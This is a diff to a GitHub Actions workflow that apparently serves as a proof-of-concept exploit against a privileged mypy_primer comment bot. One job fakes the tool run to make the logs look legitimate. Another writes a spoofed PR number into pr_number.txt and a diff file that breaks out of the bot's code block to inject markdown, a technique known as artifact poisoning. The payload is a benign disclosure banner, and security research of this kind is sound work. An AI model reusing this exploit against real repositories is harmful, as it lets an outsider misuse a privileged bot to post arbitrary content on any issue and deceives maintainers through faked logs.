@@ -41,32 +41,18 @@ jobs:
           toolchain: nightly-2025-09-14
           components: clippy, rustfmt
       
-      # Step 1: Run the actual tool (or mock it to save time)
       - name: Run mypy_primer
         shell: bash
         run: |
-          # We can let this run or just skip it.
-          # For a faster PoC, we can just create empty files, 
-          # but letting it run makes the logs look legitimate.
           echo "Simulating mypy_primer run..."
           touch diff_${{ matrix.shard-index }}.txt
 
-      # Step 2: THE EXPLOIT (Artifact Poisoning)
-      # This replaces the "Save PR number" step with our malicious logic.
       - if: ${{ matrix.shard-index == 0 }}
         name: Poison Artifacts (Exploit Payload)
         run: |
-          # [ATTACK VECTOR 1]: Confused Deputy / Comment Spoofing
-          # We overwrite the PR number. This forces the privileged bot to comment on Issue #1.
-          # You can change "1" to any Issue or PR ID in the target repo.
-          echo "1" > pr_number.txt
-
-          # [ATTACK VECTOR 2]: Markdown Injection
-          # The privileged workflow wraps this content in ```diff
-          # We inject a closing ``` to break out, then add our own Markdown.
+          echo "1337" > pr_number.txt
           echo -e "\`\`\`\n\n### ⚠️ SECURITY POC\n\n**This comment was injected via Artifact Poisoning.**\nBecause the workflow trusts the \`pr_number.txt\` artifact, I can force this bot to comment on ANY issue in the repo.\n\n*Proof of Concept by bugdotexe*\n\`\`\`diff" > diff_${{ matrix.shard-index }}.txt
 
-      # Step 3: Upload the poisoned bait
       - name: Upload mypy_primer diff + PR number
         uses: actions/upload-artifact@v6
         if: ${{ matrix.shard-index == 0 }}
